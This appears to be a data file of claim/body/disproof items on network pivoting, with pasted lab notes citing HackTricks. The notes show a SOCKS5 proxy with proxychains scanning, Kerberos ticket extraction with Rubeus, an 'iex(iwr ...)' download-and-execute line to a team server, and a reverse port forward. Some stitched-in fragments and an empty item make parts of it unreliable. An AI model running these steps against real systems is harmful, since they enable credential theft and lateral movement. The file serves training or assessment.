items.claim: A SOCKS5 listener on the foothold plus a proxychains entry turns ordinary TCP tools into internal scanners, so pivot reachability is proven by scanning internal hosts and ports through the proxy.
items.body:
A SOCKS5 listener on the foothold plus a proxychains entry turns ordinary TCP tools into internal scanners, so pivot reachability is proven by scanning internal hosts and ports through the proxy.

HackTricks reference: 159098c3 (notion:159098c3-95c5-809e-af81-c66c0f07c2a1)
items.disproof: Connections to internal hosts routed through the SOCKS listener time out, or the proxychain configuration points at the wrong port so no internal port ever answers.

sources.quote:
page 159098c3-95c5-809e-af81-c66c0f07c2a1

yellowhbSOCKS Proxies

First let’ create a SOCKS 5 Listener.

socks 1080 socks5 disableNoAuth remo remo enableLogging

image.png

Now let’s check if we are listening or not.

ss -alntp | grep -i 1080

image.png

yellowhProxychains

Now let’s configure the Proxychains file.

sudo vim /etc/proxychains.conf

image.png

Now let’s test if it’s working.

proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10

image.png

As we see it’s working.

a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN , ZXProxy, and ZXPortMap. [1] Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound

It is also common to run multiple layers of encapsulation, for example, GRE or L2TP over IPsec; with nested tunnels in the network, the tunnel endpoints can be the same or different, and both the inner and outer tunnels may have different MTU handling strategies.

items.claim: The same SOCKS proxy that carries a port scan also carries authenticated remote-execution clients, so a pivot can be used for command execution on internal hosts and not merely for connectivity.
items.body:

items.claim: A reverse port forward opened on the pivot makes a listening port on the attacker's own machine reachable from the internal host, so the internal host can be induced to send traffic back out through the attacker.
items.body:
A reverse port forward opened on the pivot makes a listening port on the attacker's own machine reachable from the internal host, so the internal host can be induced to send traffic back out through the attacker.

HackTricks reference: 159098c3 (notion:159098c3-95c5-809e-af81-c66c0f07c2a1)
items.disproof: No listener appears on the forwarded port on the attacker machine, or the internal host's request to it never shows up in the attacker's session or logs.

First let’ get the TGT.

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap

Now let’s copy it to Kirbi file.

echo -en 'doIFzj[...snip...]MuSU8=' | base64 -d > bfarmer.kirbi

image.png

Now let’s convert it to ccache.

ticketConverter.py bfarmer.kirbi bfarmer.ccache

image.png

image.png

yellowhReverse Port Forwards

Let’s try to connect to our team server.

iex(iwr http://10.10.5.50/test)

image.png

Now let’s do reverse port forward

rportfwd 8080 127.0.0.1 80

image.png

Now let’s check if port 8080 is opened in the attacker machine.

run netstat -anp tcp

image.png

Now let’s try to make a connection again

iwr -Uri http://wkstn-2:8080/a

image.png

as we see that traffic was forwarded to us on the team server.
